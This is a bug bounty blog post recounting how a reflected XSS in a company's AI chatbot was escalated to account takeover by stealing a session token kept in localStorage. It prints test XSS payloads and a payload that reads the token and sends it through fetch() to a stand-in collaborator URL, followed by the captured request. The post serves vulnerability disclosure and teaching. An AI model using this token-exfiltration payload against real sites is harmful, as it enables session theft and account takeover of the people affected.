# From “Meh, It’s Just Reflected XSS” to “Sh*t, I Own the CEO” 🎭

> **Author**: Shah kaif
> **Published**: Nov 24, 2025

---

Top highlight

![Shah kaif](https://miro.medium.com/v2/resize:fill:32:32/1*ZCwTvovflA3nGDtIka9AAQ.jpeg)

116

5

Listen

Share

By 
Shah kaif
 | How I went from disappointment to shock in 30 minutes | LinkedIn | Youtube

![image](https://miro.medium.com/v2/resize:fit:700/1*W56pa4MA58Cei-HBgi7Rhg.png)

Found! what I thought was boring Reflected XSS (yawn 😴). Companies usually mark this as “Low” severity. Got sad. Got curious. Found they stored auth tokens in localStorage. Got excited. Stole CEO’s session token. Got access to everything. Got shocked.

Severity: Started at “Low/Medium”, ended at “CRITICAL 8.8”
Lesson: Never give up on a vulnerability. Sometimes the rabbit hole goes deeper than you think.

I also follow recon steps from https://recon.vulninsights.codes

## Act 1: The Disappointment

So there I was, testing Target.com AI chatbot, throwing my usual XSS payloads at it:

```
<h1>hello</h1>
<i style="color:red">hello</i>
<a href="https://google.com">Hello</a>
<img src=x onerror=alert(document.domain)>
```

They all worked.

![image](https://miro.medium.com/v2/resize:fit:1917/1*ZY7Hb13O5r4KsMml1jTqmA.png)

![image](https://miro.medium.com/v2/resize:fit:1917/1*b7Lqdv9v9Q-NgPOyPl470w.png)

My first reaction?

“Cool, XSS! Wait… it’s just reflected. Damn.”

Here’s the thing about Reflected XSS (RXSS): Some companies treat it like finding a mosquito in your house. Annoying? Yes. Life-threatening? Nah.

Typical Bug Bounty Response:

- “Thanks for the report!”
- Severity: Low/Medium
- Bounty: $50 (if you’re lucky)

I was about to close my Burp Suite and then something inside me said: “Wait… let’s dig deeper.”

## The “Wait a Minute…” Moment 🤔

Here’s what went through my mind:

Me: “Okay, I have XSS. But RXSS is boring. How do I make this… spicier?”
Also Me: “What if this is actually Stored XSS and triggers when employees view it?”
My Brain: “Even if it is, you need something valuable to steal…”

Then it hit me like a truck full of security textbooks: Authentication tokens!

## The Investigation Begins

I opened the browser DevTools and started hunting. I know from experience that most modern web apps use:

- Bearer tokens for API authentication
- Session tokens stored somewhere in the browser
- Usually in localStorage, sessionStorage, or cookies

I checked the Network tab. Sure enough, every request had this beautiful header:

```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

“Okay, so they use Bearer tokens. But where do they store them?”

I opened the DevTools => Application [Chromium]:

![image](https://miro.medium.com/v2/resize:fit:700/1*M0T5K3oCM732taesOGm7gQ.png)

```
localStorage
```

And there it was, sitting pretty like a treasure chest with no lock:

```
localStorage.getItem('sb-jlmhsrfinffrgxcfkycl-auth-token')
```

## The “OH SH*T” Realization 😱

My jaw literally dropped. They were storing the session authentication token in localStorage?!

For those who don’t know, storing auth tokens in localStorage is like:

- Keeping your house keys in your mailbox
- Writing your PIN on your credit card
- Posting your password on your Instagram story

IT’S A TERRIBLE IDEA.

Why? Because any JavaScript can access it. Including malicious JavaScript. Including my JavaScript.

## Act 3: From Disappointment to Jackpot

Suddenly, my “boring” Reflected XSS transformed into something beautiful:

Before: “Meh, just RXSS, probably won’t even get accepted”
After: “HOLY SH*T THIS IS A CRITICAL ACCOUNT TAKEOVER VULNERABILITY”

## Get Shah kaif’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

The math was simple:

```
Stored XSS + localStorage token = Account Takeover
```

## The Payload Evolution

I crafted the my payload:

```
<img src=x onerror="
  var token = localStorage.getItem('sb-jlmhsrfinffrgxcfkycl-auth-token');
  if(token){
    fetch('https://YOUR-BURP-COLLABORATOR.com/steal?token=' + encodeURIComponent(token))
  }
">
```

This bad boy would:

- Execute when someone views my message.
- Grab the auth token from localStorage.
- Send it to my Burp Collaborator server.
- Make me feel like a movie hacker.

## Setting the Trap

I fired up Burp Collaborator (basically a server that logs everything), copied the URL, updated my payload, and hit send.

Now came the waiting game… ⏰

## Act 4: The Token Heist 💰

30 minutes later…

PING!

My Burp Collaborator lit up like a Christmas tree:

```
GET /steal?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOi...
```

I HAD THE TOKEN.

But whose token was it? A random employee? A support agent? I needed to decode this JWT to find out.

## The Identity Reveal

I copied the token, headed to jwt.io, pasted it in, and watched as the payload decoded:

![image](https://miro.medium.com/v2/resize:fit:1917/1*vPcNIR876WNG5wGkV0HfxA.png)

![image](https://miro.medium.com/v2/resize:fit:1917/1*ajQjoBwLfsL4xxOw9e69Og.png)

Wait… team@target.com? i think that’s just an employee session. That's an internal team account.

## The “Holy Sh*t” Moment Part 2

I sat there staring at my screen thinking, let’s search the company CEO name:

![image](https://miro.medium.com/v2/resize:fit:700/1*_UNQkdv2StJyqGoywxJcJw.png)

BOOM. 💥

“I went from ‘meh, low severity RXSS’ to ‘I just compromised the CEO’s account’ in like 30 minutes.”

Full. Account. Takeover.

## What Just Happened? (Let Me Explain)

## The Vulnerability Chain

- Stored XSS — My payload was stored and viewed by internal staff (CEO account)
- localStorage Token Storage — Auth tokens accessible to JavaScript
- No Token Protection — No HTTP-only cookies, no security
- High-Privilege Victim — Internal team member with god-tier access
- Complete Account Takeover — Full access to CRM, data, everything

## Why Companies Store Tokens in localStorage (And Why They Shouldn’t)

Why they do it:

- Easy to implement
- Works across tabs
- Simple to access from JavaScript
- “It’s convenient!”

Why they SHOULDN’T:

- Any JavaScript can read it (including XSS)
- Not protected from XSS attacks
- Stays even after browser close
- No built-in expiration
- Security nightmare 🔥

Check out my Youtube channel i also demonstrate this attack — https://www.youtube.com/watch?v=t3bnq0H1yec



---
*Original URL: [https://medium.com/bugbountywriteup/from-meh-its-just-reflected-xss-to-sh-t-i-own-the-ceo-0e0793ef7186?source=search_post---------130-----------------------------------](https://medium.com/bugbountywriteup/from-meh-its-just-reflected-xss-to-sh-t-i-own-the-ceo-0e0793ef7186?source=search_post---------130-----------------------------------)*
